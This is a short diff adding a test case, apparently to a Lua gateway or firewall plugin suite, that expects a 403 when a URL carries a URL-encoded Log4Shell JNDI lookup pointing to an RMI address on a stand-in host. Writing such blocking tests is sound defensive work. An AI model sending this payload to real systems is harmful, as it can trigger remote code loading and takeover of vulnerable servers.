@@ -117,6 +117,15 @@ for _, strategy in helpers.all_strategies() do
       assert.response(r).has.status(403)
     end)
 
+      it("Checks in the URL", function()
+        local r = client:get("/request?$%7bjndi%3armi%3a%2f%2fexample.dev%2fa%7d=1", {
+          headers = {
+            host = "test1.dev",
+          }
+        })
+        assert.response(r).has.status(403)
+      end)
+
   end)
 
 
